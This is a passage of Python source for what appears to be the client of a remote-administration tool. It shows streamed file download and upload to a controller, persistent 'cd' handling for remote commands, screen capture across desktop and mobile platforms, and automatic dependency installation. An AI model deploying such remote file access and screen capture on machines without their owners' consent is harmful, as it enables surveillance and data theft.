                        if sent and sent % (8 * 1024 * 1024) < TRANSFER_CHUNK:
                            send_msg(conn, {
                                'type': 'transfer_progress', 'id': req_id,
                                'received': received + sent,
                                'total': plan['total_bytes']})
            except OSError as e:
                send_msg(conn, {'type': 'transfer_abort', 'id': req_id,
                                'reason': 'could not read {}: {}'.format(
                                    source, e)})
                send_msg(conn, {'type': 'transfer_end', 'id': req_id})
                return
            send_msg(conn, {'type': 'transfer_file_end', 'id': req_id,
                            'path': rel, 'size': sent,
                            'hash': digest.hexdigest()})
            received += sent
        send_msg(conn, {'type': 'transfer_end', 'id': req_id})
    except OSError:
        # A socket error has already desynchronized the stream; let the main
        # loop shut this link down and reconnect.
        raise


def _serve_download_request(conn, msg, req_id, current_dir):
    """Answer one 'download' request.

    The current controller always sets ``stream``: files of every size and
    whole folders use the streamed protocol.  A request from an older
    controller without that flag keeps the old single-message reply only when
    the file is small enough for one protocol message.
    """
    raw_path = msg.get('path', '')
    if not isinstance(raw_path, str):
        send_msg(conn, {'type': 'error', 'id': req_id,
                        'data': 'download: path must be text'})
        return
    path = os.path.expanduser(raw_path)
    real_path = path if os.path.isabs(path) else os.path.join(current_dir, path)
    try:
        info = os.stat(real_path)
        if (stat.S_ISDIR(info.st_mode) or msg.get('stream')
                or not stat.S_ISREG(info.st_mode)
                or info.st_size > (MAX_MSG * 3) // 4):
            if not (stat.S_ISDIR(info.st_mode) or stat.S_ISREG(info.st_mode)):
                raise OSError('not a regular file or folder')
            _start_download_transfer(conn, req_id, real_path)
            return
        with open(real_path, 'rb') as f:
            raw = f.read((MAX_MSG * 3) // 4 + 1)
        if len(raw) > (MAX_MSG * 3) // 4:
            _start_download_transfer(conn, req_id, real_path)
            return
        data = base64.b64encode(raw).decode('ascii')
        send_msg(conn, {'type': 'file', 'id': req_id,
                        'name': os.path.basename(real_path),
                        'data': data})
    except Exception as e:
        try:
            send_msg(conn, {'type': 'error', 'id': req_id,
                            'data': 'download failed: {}'.format(e)})
        except OSError:
            pass


class _IncomingTransfer(object):
    """Client-side receive state for a streamed upload."""

    def __init__(self, msg, current_dir):
        self.kind = 'dir' if msg.get('kind') == 'dir' else 'file'
        self.entries = msg.get('entries') if isinstance(msg.get('entries'), list) else []
        try:
            self.total_files = max(0, int(msg.get('total_files') or 0))
        except (TypeError, ValueError):
            self.total_files = 0
        try:
            self.total_bytes = max(0, int(msg.get('total_bytes') or 0))
        except (TypeError, ValueError):
            self.total_bytes = 0
        self.received = 0
        self.files_done = 0
        self.error = ''
        self.handle = None
        self.tmp = None
        self.target = None
        self.expected_size = 0
        self.expected_hash = ''
        self.digest = None
        self.mode = None
        self.base = None
        self.single_target = None
        self.seen_targets = set()
        root = _safe_transfer_rel(msg.get('root') or '')
        if not root:
            self.error = 'the controller sent an unsafe destination name'
            return
        try:
            if self.kind == 'dir':
                self.base = _safe_join_under(current_dir, root)
                if not os.path.isdir(self.base):
                    os.mkdir(self.base)
                self.add_entries({'entries': self.entries})
            else:
                self.single_target = _safe_join_under(current_dir, root)
                if os.path.isdir(self.single_target):
                    self.error = 'destination is a folder: {}'.format(
                        self.single_target)
        except OSError as e:
            self.error = str(e)

    def add_entries(self, msg):
        if self.error or self.kind != 'dir' or not self.base:
            return
        entries = msg.get('entries')
        if not isinstance(entries, list):
            return
        try:
            for entry in entries:
                if isinstance(entry, dict) and entry.get('kind') == 'dir':
                    rel = _safe_transfer_rel(entry.get('path'))
                    if rel:
                        folder = _safe_join_under(self.base, rel)
                        if not os.path.isdir(folder):
                            os.mkdir(folder)
        except OSError as e:
            self.error = str(e)

    def start_file(self, msg):
        if self.error:
            return
        rel = _safe_transfer_rel(msg.get('path'))
        if not rel:
            self.error = 'the controller sent an unsafe file path'
            return
        try:
            self.expected_size = max(0, int(msg.get('size') or 0))
        except (TypeError, ValueError):
            self.error = 'invalid file size in transfer metadata'
            return
        self.expected_hash = str(msg.get('hash') or '')
        try:
            self.mode = int(msg.get('mode') or 0) & 0o777
        except (TypeError, ValueError):
            self.mode = None
        target = None
        try:
            if self.kind == 'file':
                target = self.single_target
                if target is None:
                    raise OSError('no destination for this file')
            else:
                target = _safe_join_under(self.base, rel)
            identity = os.path.normcase(os.path.abspath(target))
            if identity in self.seen_targets:
                self.error = 'duplicate destination path: {}'.format(rel)
                return
            self.seen_targets.add(identity)
            self.target = target
            parent = os.path.dirname(target) or os.getcwd()
            fd, self.tmp = tempfile.mkstemp(prefix='.cmon-in-', dir=parent)
            self.handle = os.fdopen(fd, 'wb')
            self.digest = hashlib.sha256()
        except OSError as e:
            self.error = 'could not create {}: {}'.format(
                target or rel, e)
            self._discard_file()

    def add_chunk(self, data):
        if self.error or self.handle is None:
            return
        try:
            raw = base64.b64decode(data, validate=True) if isinstance(data, str) else b''
        except Exception:
            self.error = 'invalid base64 in transfer'
            self._discard_file()
            return
        if not raw or len(raw) > MAX_TRANSFER_CHUNK:
            self.error = 'invalid transfer chunk size'
            self._discard_file()
            return
        try:
            self.handle.write(raw)
            self.digest.update(raw)
            self.received += len(raw)
        except OSError as e:
            self.error = 'write failed: {}'.format(e)
            self._discard_file()

    def end_file(self, msg=None):
        if self.handle is None:
            return
        try:
            self.handle.flush()
            os.fsync(self.handle.fileno())
        except OSError:
            pass
        try:
            self.handle.close()
        except OSError:
            pass
        self.handle = None
        digest = self.digest.hexdigest() if self.digest else ''
        ok = not self.error
        if ok:
            try:
                actual = os.path.getsize(self.tmp)
            except OSError:
                actual = -1
            if actual != self.expected_size:
                ok = False
                self.error = ('size mismatch for {} (expected {}, got {})'
                              .format(self.target, self.expected_size, actual))
            if ok and self.expected_hash and digest != self.expected_hash:
                ok = False
                self.error = 'checksum mismatch for {}'.format(self.target)
        if ok:
            if self.mode is not None and os.name != 'nt':
                try:
                    os.chmod(self.tmp, self.mode)
                except OSError:
                    pass            # a FAT/network mount may not support modes
            try:
                os.replace(self.tmp, self.target)
                self.tmp = None
                self.files_done += 1
            except OSError as e:
                ok = False
                self.error = 'could not save {}: {}'.format(self.target, e)
        if not ok:
            self._discard_file()
        self.expected_size = 0
        self.expected_hash = ''
        self.digest = None

    def abort(self, msg):
        if not self.error:
            self.error = str(msg.get('reason') or 'the controller aborted the transfer')
        self._discard_file()

    def _discard_file(self):
        if self.handle is not None:
            try:
                self.handle.close()
            except OSError:
                pass
            self.handle = None
        if self.tmp:
            try:
                os.remove(self.tmp)
            except OSError:
                pass
            self.tmp = None
        self.digest = None

    def finish(self):
        if self.handle is not None and not self.error:
            self.error = 'the transfer ended in the middle of a file'
        self._discard_file()
        if not self.error:
            if self.kind == 'file' and self.files_done != 1:
                self.error = 'the file was not completed'
            elif (self.kind == 'dir' and self.total_files
                  and self.files_done != self.total_files):
                self.error = ('upload incomplete ({} of {} files)'
                              .format(self.files_done, self.total_files))
        if self.error:
            return 'error', 'upload failed: {}'.format(self.error)
        where = self.base if self.kind == 'dir' else self.single_target
        return ('output',
                'Saved to {} ({} file{}, {} bytes)'.format(
                    where, self.files_done,
                    '' if self.files_done == 1 else 's', self.received))


INCOMING_TRANSFERS = {}
INCOMING_LOCK = threading.Lock()


def _incoming_key(req_id):
    return req_id if _valid_req_id(req_id) else None


def _incoming_begin(msg, req_id, current_dir):
    key = _incoming_key(req_id)
    if key is None:
        return
    with INCOMING_LOCK:
        old = INCOMING_TRANSFERS.pop(key, None)
    if old is not None:
        old._discard_file()
    INCOMING_TRANSFERS[key] = _IncomingTransfer(msg, current_dir)


def _incoming_drop(req_id):
    key = _incoming_key(req_id)
    if key is None:
        return None
    with INCOMING_LOCK:
        return INCOMING_TRANSFERS.pop(key, None)


def _abort_incoming_transfers():
    with INCOMING_LOCK:
        states = list(INCOMING_TRANSFERS.values())
        INCOMING_TRANSFERS.clear()
    for state in states:
        state._discard_file()


def _handle_transfer_message(conn, msg, req_id, current_dir):
    """Feed one upload-protocol message to its receive state.

    Called both by the idle read loop and by run_command's control-message
    loop, so a long foreground command cannot make a background upload's
    chunks pile up in (or overflow) the deferred-request queue."""
    mtype = msg.get('type')
    if mtype == 'transfer_begin':
        _incoming_begin(msg, req_id, current_dir)
        return
    key = _incoming_key(req_id)
    state = INCOMING_TRANSFERS.get(key) if key is not None else None
    if state is None:
        return
    if mtype == 'transfer_entries':
        state.add_entries(msg)
    elif mtype == 'transfer_file_begin':
        state.end_file()                # a previous file was truncated
        state.start_file(msg)
    elif mtype == 'transfer_chunk':
        state.add_chunk(msg.get('data'))
    elif mtype == 'transfer_file_end':
        state.end_file(msg)
    elif mtype == 'transfer_abort':
        state.abort(msg)
    elif mtype == 'transfer_end':
        state = _incoming_drop(req_id)
        if state is not None:
            rtype, text = state.finish()
            send_msg(conn, {'type': rtype, 'id': req_id, 'data': text})


PREV_DIR = None                 # remembered so 'cd -' works like in a real shell


def change_dir(command, current_dir):
    """Intercept a plain 'cd' so the directory persists between commands.
    Returns (new_dir, output_or_None), or None if it's not a plain cd."""
    global PREV_DIR
    cmd = command.strip()
    low = cmd.lower()
    if low != 'cd' and not low.startswith('cd '):
        return None
    if any(op in cmd for op in ('&&', '||', ';', '|')):
        return None  # compound command: let the shell run it

    target = cmd[2:].strip()
    if os.name == 'nt' and target.lower().startswith('/d '):   # Windows: cd /d C:\path
        target = target[3:].strip()
    if os.name != 'nt' and target:
        # Support shell-style quoting and backslash escapes in cd arguments
        # (`cd "a b"`, `cd a\ b`, `cd 'a\b'`). shlex.split must see the
        # quotes: stripping them first turned a literal backslash in a quoted
        # POSIX name into an escape and lost the character.
        try:
            import shlex
            parts = shlex.split(target)
            if len(parts) == 1:
                target = parts[0]
        except (ImportError, ValueError):
            if len(target) >= 2 and target[0] == target[-1] and target[0] in ('"', "'"):
                target = target[1:-1]
    elif len(target) >= 2 and target[0] == target[-1] and target[0] in ('"', "'"):
        target = target[1:-1]

    if target == '':
        return current_dir, current_dir      # bare 'cd' prints the directory

    target = os.path.expandvars(os.path.expanduser(target))
    if target == '-':                        # 'cd -' -> the previous directory
        if PREV_DIR and os.path.isdir(PREV_DIR):
            new_dir = PREV_DIR
            PREV_DIR = current_dir             # next 'cd -' swaps back
            return new_dir, new_dir
        return current_dir, 'cd: OLDPWD not set'

    new_dir = target if os.path.isabs(target) else os.path.join(current_dir, target)
    new_dir = os.path.normpath(new_dir)
    if os.path.isdir(new_dir):
        PREV_DIR = current_dir
        return new_dir, None
    if os.path.exists(new_dir):
        return current_dir, "cd: {}: Not a directory".format(target)
    return current_dir, "cd: {}: No such file or directory".format(target)


def _ensure_dependencies_impl():
    """Make sure Pillow (screen capture) is importable, installing it with
    pip when it is missing. Returns True if it is ready."""
    try:
        import PIL
    except ImportError:
        PIL = None

    # Stock iOS gives sandboxed Python apps no way to capture the screen (or
    # run a background shell); don't waste time trying to pip-install Pillow.
    if PIL is None and is_ios():
        print("[!] Screen capture is not available on stock iOS/iPadOS:")
        print("    Apple does not let a sandboxed Python app capture the screen,")
        print("    and background execution stops after ~30 seconds.")
        print("    This client only works fully on a jailbroken device with a")
        print("    full Python (pty + screencapture).")
        return False

    # Termux has a ready-made Pillow package; pip would have to compile it.
    if PIL is None and is_android():
        pkg = shutil.which('pkg')
        if pkg:
            print("[+] Pillow (screen capture) is missing - installing via Termux packages...")
            try:
                if subprocess.run([pkg, 'install', '-y', 'python-pillow'],
                                  timeout=600).returncode == 0:
                    pass
            except Exception as e:
                print("[!] pkg install failed: {}".format(e))
            try:
                import PIL
            except ImportError:
                PIL = None

    if PIL is None:
        print("[+] Pillow (screen capture) is not installed - trying to install it automatically...")
        python = sys.executable or 'python'

        # Bootstrap pip when even that is missing (fresh Windows Python,
        # pure Arch without python-pip, ...)
        try:
            has_pip = subprocess.run([python, '-m', 'pip', '--version'],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                     timeout=60).returncode == 0
        except Exception:
            has_pip = False
        if not has_pip:
            print("[+] pip is missing too - trying to bootstrap it with ensurepip...")
            for bootstrap in ([python, '-m', 'ensurepip', '--upgrade'],
                              [python, '-m', 'ensurepip', '--upgrade', '--user']):
                try:
                    if subprocess.run(bootstrap, stdout=subprocess.DEVNULL,
                                      stderr=subprocess.DEVNULL, timeout=300,
                                      **_quiet_flags()).returncode == 0:
                        break
                except Exception:
                    pass

        # Try every way a machine may accept a pip install:
        #  - normal venv/Windows install
        #  - user site (works without root)
        #  - PEP 668 distros (Debian 12+, Ubuntu 23.04+, Arch/Omarchy, and
        #    Homebrew Python on macOS) block system pip, so also try the
        #    escape hatch, with and without --user
        attempts = [
            [python, '-m', 'pip', 'install', 'pillow'],
            [python, '-m', 'pip', 'install', '--user', 'pillow'],
            [python, '-m', 'pip', 'install', '--break-system-packages', 'pillow'],
            [python, '-m', 'pip', 'install', '--break-system-packages', '--user', 'pillow'],
        ]
        for cmd in attempts:
            try:
                print("[+] Running: {}".format(' '.join(cmd)))
                if subprocess.run(cmd, timeout=600, **_quiet_flags()).returncode == 0:
                    break
            except Exception as e:
                print("[!] Installer failed: {}".format(e))

        try:
            import PIL
        except ImportError:
            PIL = None

        # Last resort: the distro's own package manager (needs root)
        if PIL is None and not is_android() and hasattr(os, 'geteuid') and os.geteuid() == 0:
            for tool, cmd in (
                    ('pacman', ['pacman', '-S', '--noconfirm', '--needed',
                                'python-pillow', 'grim']),
                    ('apt-get', ['apt-get', 'install', '-y', 'python3-pil']),
                    ('dnf', ['dnf', 'install', '-y', 'python3-pillow']),
                    ('zypper', ['zypper', '--non-interactive', 'install', 'python3-Pillow'])):
                if not shutil.which(tool):
                    continue
                try:
                    print("[+] Running: {}".format(' '.join(cmd)))
                    subprocess.run(cmd, timeout=600)
                except Exception as e:
                    print("[!] {} failed: {}".format(tool, e))
                    continue
                try:
                    import PIL
                    break
                except ImportError:
                    continue

        # RHEL keeps Pillow in EPEL. Rather than enabling a third-party repo
        # behind the user's back, install pip and fetch Pillow from PyPI (the
        # same source the pip attempts above use). Works on stock RHEL 9/10.
        if PIL is None and shutil.which('dnf') and not is_android():
            if distro_info()[0] in ('rhel', 'centos', 'rocky', 'almalinux', 'ol'):
                print("[+] RHEL: Pillow is in EPEL; trying PyPI via pip instead...")
                for cmd in (['dnf', 'install', '-y', 'python3-pip'],
                            [python, '-m', 'pip', 'install', 'pillow']):
                    try:
                        if subprocess.run(cmd, timeout=600, capture_output=True,
                                          text=True,
                                          **_quiet_flags()).returncode != 0:
                            print("[!] Installer failed: {}".format(' '.join(cmd)))
                            break
                    except Exception as e:
                        print("[!] Installer failed: {}: {}".format(' '.join(cmd), e))
                        break
                try:
                    import PIL
                except ImportError:
                    pass

        try:
            import PIL
        except ImportError:
            print("[!] Could not install Pillow automatically. Install it by hand:")
            print("    Windows:           py -m pip install pillow")
            print("    macOS:             python3 -m pip install --break-system-packages --user pillow")
            print("    Arch Linux:        sudo pacman -S python-pillow grim")
            print("    Debian/Ubuntu:     sudo apt install python3-pil")
            print("    Fedora:            sudo dnf install python3-pillow")
            print("    RHEL/Rocky/Alma:   sudo dnf install python3-pip")
            print("                       python3 -m pip install --user pillow")
            print("    RHEL EPEL:         enable epel-release from dl.fedoraproject.org,")
            print("                       then sudo dnf install python3-pillow")
            print("    Android (Termux):  pkg install python-pillow")
            return False

    if is_android():
        print("[+] Pillow ready. Android screen capture needs root (su + screencap);")
        print("    commands, downloads, uploads and the interactive shell work without it.")
        return True

    if is_ios():
        print("[!] Screen capture is unavailable on stock iOS/iPadOS (screenshots and")
        print("    screen sharing will report this). Commands/files need a jailbroken device.")
        return False

    if is_macos():
        print("[+] Screen capture ready (Pillow {}; screencapture fallback).".format(PIL.__version__))
        print("    If captures show only the wallpaper, allow Screen & System Audio")
        print("    Recording for your terminal in System Settings > Privacy & Security.")
        print("    (The pane is called Screen Recording on older macOS.)")
        return True

    if sys.platform.startswith('linux') and os.environ.get('WAYLAND_DISPLAY'):
        desktop = os.environ.get('XDG_CURRENT_DESKTOP', 'unknown').split(':')[0]
        available = [t for t in ('grim', 'spectacle', 'scrot') if shutil.which(t)]
        print("[+] Wayland session ({}): capture helpers found: {}.".format(
            desktop, ', '.join(available) if available else 'none'))

    print("[+] Screen capture ready (Pillow {}).".format(PIL.__version__))
    return True


_ENSURE_LOCK = threading.Lock()
_ENSURE_READY = [False]
_ENSURE_LAST_TRY = [0.0]


def ensure_dependencies():
    """Check Pillow once, not on every capture.

    The old code re-ran the whole pip/apt install chain on every screenshot
    when Pillow could not be installed, so each capture stalled for minutes.
    A failed attempt is remembered for 10 minutes (a manual install while the
    client runs is still picked up afterwards)."""
    try:
        import PIL  # noqa: F401
        _ENSURE_READY[0] = True
        return True
    except ImportError:
        pass
    with _ENSURE_LOCK:
        if _ENSURE_READY[0]:
            return True
        if _ENSURE_LAST_TRY[0] and time.monotonic() - _ENSURE_LAST_TRY[0] < 600:
            return False
        _ENSURE_LAST_TRY[0] = time.monotonic()
        result = _ensure_dependencies_impl()
        _ENSURE_READY[0] = bool(result)
        return result


class CaptureError(RuntimeError):
    """Screen capture failed - carries the per-backend details so the
    controller can show what was tried and how to fix it."""

    def __init__(self, message, attempts):
        super().__init__(message)
        self.attempts = attempts


def distro_info():
    """(distro id, pretty name) for the current machine."""
    if is_android():
        return 'android', android_name()
    if is_ios():
        return 'ios', ios_name()
    if is_macos():
        return 'macos', macos_name()
    if not sys.platform.startswith('linux'):
        return (platform.system().lower() or 'unknown',
                '{} {}'.format(platform.system(), platform.release()))
    try:
        with open('/etc/os-release') as f:
            info = dict(line.strip().split('=', 1) for line in f if '=' in line)
        distro_id = info.get('ID', 'linux').strip('"').lower()
        name = info.get('PRETTY_NAME', info.get('NAME', 'Linux')).strip('"')
        return distro_id, name
    except Exception:
        return 'linux', 'Linux'


def _imagemagick_command():
    """ImageMagick's CLI name varies: IM7 unifies it as 'magick import', and
    Debian/Ubuntu ship only versioned names (magick-im7.q16 / import-im7.q16).
    None means ImageMagick is not usable here."""
    exe = shutil.which('magick') or shutil.which('magick-im7.q16')
    if exe:
        return [exe, 'import', '-window', 'root', 'png:-']
    exe = shutil.which('import') or shutil.which('import-im7.q16')
    if exe:
        return [exe, '-window', 'root', 'png:-']
    return None


def environment_report():
    """What this machine has for screen capture. Sent to the controller on
    connect (and with capture errors) so it can explain anything missing."""
    distro_id, distro_name = distro_info()
    if is_android():
        session = 'android'
        desktop = ('Termux' if (os.environ.get('PREFIX') or '').startswith(
            '/data/data/com.termux') else 'Android')
    elif is_ios():
        session = 'ios'
        desktop = 'iOS'
    elif is_macos():
        session = ('ssh' if (os.environ.get('SSH_CONNECTION')
                             or os.environ.get('SSH_TTY')) else 'aqua')
        desktop = 'Aqua' if session == 'aqua' else 'macOS'
    elif sys.platform.startswith('linux'):
        session = ('wayland' if os.environ.get('WAYLAND_DISPLAY') else
                   'x11' if os.environ.get('DISPLAY') else 'none')
        desktop = os.environ.get('XDG_CURRENT_DESKTOP') or 'unknown'
    else:
        session = 'desktop'
        desktop = platform.system()
    try:
        import PIL
        pillow = getattr(PIL, '__version__', 'present')
    except ImportError:
        pillow = None
    try:
        has_pyautogui = importlib.util.find_spec('pyautogui') is not None
    except Exception:
        has_pyautogui = False
    helpers = {
        'pillow': pillow,
        'pyautogui': has_pyautogui,
        'grim': shutil.which('grim') is not None,
        'spectacle': shutil.which('spectacle') is not None,
        'gnome_dbus': shutil.which('gdbus') is not None,
        'gnome_screenshot': shutil.which('gnome-screenshot') is not None,
        'imagemagick': _imagemagick_command() is not None,
        'scrot': shutil.which('scrot') is not None,
        'maim': shutil.which('maim') is not None,
        'screencapture': shutil.which('screencapture') is not None,
        'screencap': bool(shutil.which('screencap')
                          or os.path.exists('/system/bin/screencap')),
        'termux_api': bool(shutil.which('termux-open')
                           or shutil.which('termux-clipboard-get')),
    }
    if is_android():
        os_name = 'android'
    elif is_ios():
        os_name = 'ios'
    elif is_macos():
        os_name = 'macos'
    elif sys.platform.startswith('win'):
        os_name = 'windows'
    elif sys.platform.startswith('linux'):
        os_name = 'linux'
    else:
        os_name = platform.system().lower()
    return {
        'os': os_name,
        'distro': distro_id,
        'distro_name': distro_name,
        'session': session,
        'desktop': desktop,
        'python': '{}.{}.{}'.format(*sys.version_info[:3]),
        'helpers': helpers,
    }


def _capture_diag(exc):
    """Structured details about a capture failure, for the controller."""
    env = environment_report()
    helpers = env['helpers']
    if is_ios():
        category = 'ios'
    elif is_android():
        category = 'android'
    elif env['session'] == 'none':
        category = 'no_session'
    elif not any(helpers.get(k) for k in
                 ('pillow', 'pyautogui', 'grim', 'spectacle', 'gnome_screenshot',
                  'gnome_dbus', 'imagemagick', 'scrot', 'maim', 'screencapture')):
        category = 'missing_deps'
    else:
        category = 'all_failed'
    return {
        'kind': 'capture',
        'category': category,
        'attempts': list(getattr(exc, 'attempts', [])) or [str(exc)],
        'env': env,
    }


# Runs under a Python that has PyGObject (normally /usr/bin/python3 on a
# GNOME machine). It asks the XDG desktop portal for one non-interactive
# screenshot and prints the resulting file:// URI. The portal is the only
# supported capture path on GNOME: org.gnome.Shell.Screenshot refuses
# third-party callers since GNOME 41. The request handle is predicted from
# our own unique bus name + token, and the signal subscription is installed
# *before* the call, so no response can be missed.
PORTAL_SCREENSHOT_SCRIPT = r'''
import os
import sys

try:
    from gi.repository import Gio, GLib
except Exception as exc:
    sys.stderr.write('PyGObject (gi) is not available: %s' % exc)
    raise SystemExit(3)

interactive = len(sys.argv) > 1 and sys.argv[1] == '1'
token = 'analysisclient%d' % os.getpid()

try:
    bus = Gio.bus_get_sync(Gio.BusType.SESSION, None)
except Exception as exc:
    sys.stderr.write('cannot open the session bus: %s' % exc)
    raise SystemExit(3)

unique = (bus.get_unique_name() or '').lstrip(':').replace('.', '_')
expected = '/org/freedesktop/portal/desktop/request/%s/%s' % (unique, token)
state = {'done': False, 'ok': False, 'error': ''}
loop = GLib.MainLoop()


def finish(ok, text=''):
    if state['done']:
        return
    state['done'] = True
    state['ok'] = ok
    state['error'] = text
    loop.quit()


def on_response(conn, sender, path, iface, signal_name, params):
    if path != expected or state['done']:
        return
    try:
        response, results = params.unpack()
    except Exception as exc:
        finish(False, 'bad portal response: %s' % exc)
        return
    if response != 0:
        finish(False, 'screenshot request refused (portal response %s)' % response)
        return
    uri = results.get('uri') if isinstance(results, dict) else None
    if hasattr(uri, 'unpack'):
        uri = uri.unpack()
    if not uri:
        finish(False, 'the portal returned no screenshot file')
        return
    sys.stdout.write(str(uri))
    sys.stdout.flush()
    finish(True)


def on_timeout():
    finish(False, 'the desktop portal did not answer within 25s')
    return False


bus.signal_subscribe('org.freedesktop.portal.Desktop',
                     'org.freedesktop.portal.Request', 'Response',
                     None, None, Gio.DBusSignalFlags.NONE, on_response)
GLib.timeout_add_seconds(25, on_timeout)

# The Screenshot portal has no cursor option (its documented options are
# handle_token, interactive and modal).  Asking for an undocumented
# 'cursor-mode' made some portal versions fail the whole request, so the
# client draws the pointer itself from the live cursor position instead.
options = {'handle_token': GLib.Variant('s', token),
           'interactive': GLib.Variant('b', interactive)}
try:
    bus.call_sync('org.freedesktop.portal.Desktop',
                  '/org/freedesktop/portal/desktop',
                  'org.freedesktop.portal.Screenshot', 'Screenshot',
                  GLib.Variant('(sa{sv})', ('', options)),
                  GLib.VariantType('(o)'), Gio.DBusCallFlags.NONE, 10000, None)
except Exception as exc:
    sys.stderr.write('portal call failed: %s' % exc)
    raise SystemExit(4)

loop.run()
if not state['ok']:
    sys.stderr.write(state['error'] or 'portal screenshot failed')
    raise SystemExit(4)
raise SystemExit(0)
'''

# Persistent variant used for streaming: one Python process, one D-Bus
# connection, and one portal call per line read from stdin.  Starting a new
# Python/portal process for every frame cost ~70 ms on KDE; this keeps the
# capture path fast without showing Spectacle's per-shot notification.
PORTAL_STREAM_SCRIPT = r"""
import os
import sys

try:
    from gi.repository import Gio, GLib
except Exception as exc:
    sys.stderr.write('PyGObject (gi) is not available: %s' % exc)
    raise SystemExit(3)

try:
    bus = Gio.bus_get_sync(Gio.BusType.SESSION, None)
except Exception as exc:
    sys.stderr.write('cannot open the session bus: %s' % exc)
    raise SystemExit(3)

unique = (bus.get_unique_name() or '').lstrip(':').replace('.', '_')
state = {'expected': '', 'done': True, 'ok': False, 'error': '',
         'uri': '', 'loop': None, 'timer': 0}


def finish(ok, text='', uri=''):
    if state['done']:
        return
    state['done'] = True
    state['ok'] = ok
    state['error'] = text
    state['uri'] = uri
    if state['loop'] is not None:
        state['loop'].quit()


def on_response(conn, sender, path, iface, signal_name, params):
    if path != state['expected'] or state['done']:
        return
    try:
        response, results = params.unpack()
    except Exception as exc:
        finish(False, 'bad portal response: %s' % exc)
        return
    if response != 0:
        finish(False, 'screenshot request refused (portal response %s)' % response)
        return
    uri = results.get('uri') if isinstance(results, dict) else None
    if hasattr(uri, 'unpack'):
        uri = uri.unpack()
    if not uri:
        finish(False, 'the portal returned no screenshot file')
        return
    finish(True, uri=str(uri))


def on_timeout():
    finish(False, 'the desktop portal did not answer within 25s')
    return False


bus.signal_subscribe('org.freedesktop.portal.Desktop',
                     'org.freedesktop.portal.Request', 'Response',
                     None, None, Gio.DBusSignalFlags.NONE, on_response)

counter = 0
for line in sys.stdin:
    if line.strip().lower() != 'shot':
        continue
    counter += 1
    token = 'cmonshot%d_%d' % (os.getpid(), counter)
    state.update(expected='/org/freedesktop/portal/desktop/request/%s/%s'
                 % (unique, token), done=False, ok=False, error='', uri='')
    state['loop'] = GLib.MainLoop()
    state['timer'] = GLib.timeout_add_seconds(25, on_timeout)
    options = {'handle_token': GLib.Variant('s', token),
               'interactive': GLib.Variant('b', False)}
    try:
        bus.call_sync('org.freedesktop.portal.Desktop',
                      '/org/freedesktop/portal/desktop',
                      'org.freedesktop.portal.Screenshot', 'Screenshot',
                      GLib.Variant('(sa{sv})', ('', options)),
                      GLib.VariantType('(o)'), Gio.DBusCallFlags.NONE,
                      10000, None)
    except Exception as exc:
        finish(False, 'portal call failed: %s' % exc)
    if not state['done']:
        state['loop'].run()
    if state['timer']:
        try:
            GLib.source_remove(state['timer'])
        except Exception:
            pass
        state['timer'] = 0
    if state['ok']:
        sys.stdout.write('OK %s\n' % state['uri'])
    else:
        sys.stdout.write('ERR %s\n' % (state['error'] or
                                       'portal screenshot failed'))
    sys.stdout.flush()
raise SystemExit(0)
"""


_GI_PYTHON = [False]        # False = not probed yet, '' = none found, else a path


def _python_with_gi():
    """Find a Python interpreter that can import PyGObject (gi), caching the
    answer. The client itself may run under a python.org/Homebrew Python that
    cannot see the distro's gi bindings, but /usr/bin/python3 normally can."""
    cached = _GI_PYTHON[0]
    if cached is not False:
        return cached or None
    candidates = [sys.executable]
    for candidate in ('/usr/bin/python3', shutil.which('python3')):
        if candidate and candidate not in candidates:
            candidates.append(candidate)
    found = ''
    for exe in candidates:
        try:
            probe = subprocess.run([exe, '-c', 'import gi'],
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL, timeout=20)
        except Exception:
            continue
        if probe.returncode == 0:
            found = exe
            break
    _GI_PYTHON[0] = found
    return found or None


# KDE's screenshot portal is fast (~0.1s) and silent.  Keep its Python/D-Bus
# helper alive instead of starting a new interpreter for every stream frame.
# The helper exits on EOF, so it cannot outlive a client that is killed.
_PORTAL_HELPER = {'proc': None, 'lock': threading.Lock(),
                  'failed_until': 0.0}


def _stop_portal_helper_locked():
    proc = _PORTAL_HELPER['proc']
    _PORTAL_HELPER['proc'] = None
    if proc is None:
        return
    try:
        if proc.stdin is not None:
            proc.stdin.close()
    except OSError:
        pass
    try:
        proc.wait(timeout=1.0)
        return
    except Exception:
        pass
    try:
        proc.terminate()
        proc.wait(timeout=1.0)
    except Exception:
        try:
            proc.kill()
        except OSError:
            pass


def _stop_portal_helper():
    with _PORTAL_HELPER['lock']:
        _stop_portal_helper_locked()


atexit.register(_stop_portal_helper)


def _portal_helper_uri():
    """Ask the persistent portal helper for one screenshot URI.

    The helper never opens a window and does not use Spectacle's notification
    path.  A fresh helper is started only when the previous one has died.
    """
    if time.time() < _PORTAL_HELPER['failed_until']:
        raise RuntimeError('the desktop portal is temporarily disabled after '
                           'a failed request')
    exe = _python_with_gi()
    if not exe:
        _PORTAL_HELPER['failed_until'] = time.time() + 30.0
        raise RuntimeError('needs PyGObject (install python3-gi / '
                           'python3-gobject, or use an X11 session)')
    with _PORTAL_HELPER['lock']:
        proc = _PORTAL_HELPER['proc']
        if proc is None or proc.poll() is not None:
            _stop_portal_helper_locked()
            try:
                proc = subprocess.Popen(
                    [exe, '-u', '-c', PORTAL_STREAM_SCRIPT],
                    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL, start_new_session=True)
            except OSError as exc:
                _PORTAL_HELPER['failed_until'] = time.time() + 30.0
                raise RuntimeError('cannot start the portal helper: %s' % exc)
            _PORTAL_HELPER['proc'] = proc
        try:
            proc.stdin.write(b'shot\n')
            proc.stdin.flush()
        except OSError as exc:
            _stop_portal_helper_locked()
            _PORTAL_HELPER['failed_until'] = time.time() + 30.0
            raise RuntimeError('the portal helper is not accepting requests: %s' % exc)
        # Do not let a stuck portal freeze a screenshot/screen share forever.
        try:
            ready, _, _ = select.select([proc.stdout], [], [], 30.0)
        except (OSError, ValueError):
            ready = []
        if not ready:
            _stop_portal_helper_locked()
            _PORTAL_HELPER['failed_until'] = time.time() + 30.0
            raise RuntimeError('the desktop portal did not answer within 30s')
        line = proc.stdout.readline()
        if not line:
            _stop_portal_helper_locked()
            _PORTAL_HELPER['failed_until'] = time.time() + 30.0
            raise RuntimeError('the portal helper exited without a picture')
        text = line.decode('utf-8', 'replace').strip()
        if text.startswith('OK '):
            uri = text[3:].strip()
            if uri:
                _PORTAL_HELPER['failed_until'] = 0.0
                return uri
        _stop_portal_helper_locked()
